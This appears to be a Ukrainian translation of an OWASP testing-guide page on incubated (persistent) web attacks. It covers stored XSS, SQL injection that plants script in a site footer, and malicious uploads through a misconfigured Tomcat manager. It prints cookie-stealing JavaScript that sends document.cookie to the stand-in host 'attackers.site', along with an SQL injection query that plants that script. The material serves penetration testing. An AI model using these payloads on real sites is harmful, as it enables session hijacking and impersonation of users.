# Тестування на інкубовану вразливість

# Резюме

Інкубоване тестування, яке також часто називають персистентними атаками, - це складний метод тестування, для роботи якого потрібна більш ніж одна вразливість для перевірки даних. Інкубовані вразливості зазвичай використовуються для проведення атак типу "водопій" проти користувачів легальних веб-додатків.

Інкубовані уразливості мають наступні характеристики:

- По-перше, вектор атаки повинен бути збережений, він повинен зберігатися на рівні збереження, а це можливо лише за наявності слабкої перевірки даних або якщо дані надійшли в систему через інший канал, наприклад, консоль адміністратора або безпосередньо через внутрішній пакетний процес.
- По-друге, після того, як вектор атаки був "викликаний", його потрібно було б успішно виконати. Наприклад, інкубована XSS-атака вимагатиме слабкої перевірки вихідних даних, тому скрипт буде доставлений клієнту у виконуваному вигляді.

Використання деяких вразливостей або навіть функціональних особливостей веб-додатку дозволить зловмиснику підкинути фрагмент даних, який згодом буде отриманий користувачем, який нічого не підозрює, або іншим компонентом системи, використовуючи певну вразливість.

Під час тУ тесті на проникнення ```інкубовані атаки``` можна використовувати для оцінки критичності певних помилок, використовуючи знайдену проблему безпеки для побудови атаки на стороні клієнта, яка зазвичай буде спрямована на велику кількість жертв одночасно (тобто на всіх користувачів, які переглядають сайт).

Цей тип асинхронних атак охоплює широкий спектр векторів атаки, серед яких можна виділити наступні:

- Компоненти завантаження файлів у веб-додатку, що дозволяють зловмиснику завантажувати пошкоджені медіа-файли (JPEG-зображення, що експлуатують ```CVE-2004-0200```, PNG-зображення, що експлуатують ```CVE-2004-0597```, виконувані файли, сторінки сайту з активним компонентом і т.д.).
- Проблеми міжсайтового скриптингу в повідомленнях на публічних форумах (більш детальну інформацію можна знайти в розділі [Тестування на наявність збереженого міжсайтового скриптингу](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)). Зловмисник може зберігати шкідливі скрипти або код у репозиторії у внутрішній частині веб-додатку (наприклад, у базі даних), щоб цей скрипт/код міг бути виконаний одним із користувачів (кінцевими користувачами, адміністраторами тощо). Прикладом архетипової інкубованої атаки є використання міжсайтової скриптової вразливості на форумі користувача, дошці оголошень або блозі для того, щоб впровадити певний JavaScript-код на вразливій сторінці, який в кінцевому підсумку буде відображений і виконаний в браузері користувача сайту - з використанням рівня довіри до оригінального (вразливого) сайту в браузері користувача.
- SQL/XPATH ін'єкції, що дозволяють зловмиснику завантажити вміст до бази даних, який пізніше буде отримано як частину активного вмісту на веб-сторінці. Наприклад, якщо зловмисник може розмістити довільний JavaScript на дошці оголошень, щоб він виконувався користувачами, то він може отримати контроль над їхніми браузерами (наприклад, [XSS-proxy](http://sourceforge.net/projects/xss-proxy)).
- Неправильно налаштовані сервери, що дозволяють встановлювати пакети Java або подібні компоненти веб-сайтів (наприклад, Tomcat, або консолі веб-хостингу, такі як Plesk, CPanel, Helm тощо).

# Цілі тестування

- Ідентифікувати ін'єкції, які зберігаються і потребують етапу відкликання до збереженої ін'єкції.
- Зрозуміти, як може відбуватися етап виклику.
- Якщо можливо, налаштувати слухачів або активувати крок нагадування.

# Як тестувати

## Тестування чорного ящика

### Приклад завантаження файлу

Перевірте тип вмісту, дозволений для завантаження у веб-додаток, і URL-адресу для завантаженого файлу. Завантажте файл, який буде експлуатувати компонент на локальній робочій станції користувача при перегляді або завантаженні користувачем. Надішліть жертві електронного листа або іншого виду сповіщення, щоб змусити її/його переглянути сторінку. Очікуваний результат - експлойт спрацює, коли користувач перегляне отриману сторінку або завантажить і запустить файл з довіреного сайту.

### Приклад XSS на дошці оголошень

1. Введіть код JavaScript як значення для вразливого поля, наприклад<br>```<script>document.write('<img src="http://attackers.site/cv.jpg?'+document.cookie+'">')</script>```
2. Направте користувачів переглянути вразливу сторінку або зачекайте, поки користувачі самі її переглянуть. Майте “прослуховувача” на хості ```attackers.site```, який очікує на всі вхідні з’єднання.
3. Коли користувачі переглядають вразливу сторінку, запит, що містить їхній cookie (```document.cookie``` включений як частина запитуваного URL), буде надіслано на хост ```attackers.site```, наприклад: ```GET /cv.jpg?SignOn=COOKIEVALUE1;%20ASPSESSIONID=ROGUEIDVALUE; HTTP/1.1```
4. Використовуйте отримані cookies для імітації користувачів на вразливому сайті.

### Приклад SQL ін'єкції

Зазвичай цей набір прикладів використовує атаки XSS, експлуатуючи вразливість SQL-ін'єкції. Перше, що потрібно перевірити - чи має цільовий сайт вразливість SQL-ін'єкції. Це описано у [Тестування на SQL-ін'єкцію](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection). Для кожної вразливості SQL-ін'єкції існує набір обмежень, які описують тип запитів, які нападник/тестувальник має право робити.

Потім тестувальник повинен зіставити розроблені ним XSS-атаки з записами, які йому дозволено вставляти.

У подібний спосіб, як у попередньому прикладі XSS, використовуйте поле веб-сторінки, яке вразливе до проблем SQL-ін'єкцій, щоб змінити значення в базі даних, яке буде використовуватися додатком як вхід, щоб відобразити на сайті без належного фільтрування (це буде комбінація SQL-ін'єкції та XSS-проблеми). Наприклад, припустимо, що в базі даних є таблиця ```footer``` з усіма нижніми колонтитулами для сторінок веб-сайту, включаючи поле ```notice``` з юридичним повідомленням, яке з'являється внизу кожної веб-сторінки. Ви можете використовувати наступний запит для ін'єкції коду JavaScript у поле ```notice``` у таблиці ```footer``` в базі даних.

```
SELECT field1, field2, field3
FROM table_x
WHERE field2 = 'x';
   UPDATE footer
   SET notice = 'Copyright 1999-2030%20
       <script>document.write('<img src="http://attackers.site/cv.jpg?\'+document.cookie+\'">')</script>'
   WHERE notice = 'Copyright 1999-2030';
   ```

Тепер кожен користувач, який переглядає сайт, тихо надсилатиме свої cookies на ```attackers.site```.

### Неправильно налаштований сервер

Деякі веб-сервери мають інтерфейс адміністрування, який може дозволити зловмиснику завантажити на сайт активні компоненти на свій вибір. Це може статися у випадку з сервером Apache Tomcat, який не вимагає надійних облікових даних для доступу до свого менеджера веб-додатків (або якщо тестувальники змогли отримати дійсні облікові дані для модуля адміністрування іншими способами).

У цьому випадку можна завантажити WAR-файл і розгорнути новий веб-додаток на сайті, що не тільки дозволить тестувальнику виконувати код на свій вибір локально на сервері, але й розмістити додаток на довіреному сайті, до якого потім зможуть отримати доступ звичайні користувачі сайту (швидше за все, з вищим ступенем довіри, ніж при зверненні до іншого сайту).

Очевидно, що можливість змінювати вміст веб-сторінок на сервері через будь-які вразливості, які можуть бути використані на хості, що дасть зловмиснику права на запис у кореневому каталозі, також буде корисною для розміщення такої інкубованої атаки на сторінках веб-сервера (насправді, це відомий метод розповсюдження інфекції для деяких веб-серверних черв'яків).

### Тестування сірого ящика

Техніки тестування сірого або білого ящика будуть такими ж, як обговорювалося раніше.

- Вивчення перевірки вхідних даних є ключовим для захисту від цієї вразливості. Якщо інші системи на підприємстві використовують той самий рівень збереження, вони можуть мати слабку перевірку вхідних даних, і дані можуть зберігатися через ```чорний хід```.
- Для боротьби з проблемою ```чорного ходу``` для атак на стороні клієнта необхідно також використовувати перевірку вихідних даних, щоб зіпсовані дані кодувалися перед відображенням клієнту, а отже, не виконувалися.

# Інструменти

- [XSS-proxy](https://sourceforge.net/projects/xss-proxy)
- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)
- [Burp Suite](https://portswigger.net/burp)
- [Metasploit](https://www.metasploit.com/)

# Посилання

Більшість посилань з розділу "Міжсайтовий скриптинг" є актуальними. Як пояснювалося вище, інкубовані атаки виконуються при поєднанні таких експлойтів, як XSS або SQL-ін'єкції.

## Рекомендації

- [CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)
- [Blackboard Academic Suite 6.2.23 +/-: Persistent cross-site scripting vulnerability](https://cxsecurity.com/issue/WLB-2006080004)

## Довідковий матеріал

- [Web Application Security Consortium “Threat Classification, Cross-site scripting”](http://www.webappsec.org/projects/threat/classes/cross-site_scripting.shtml)
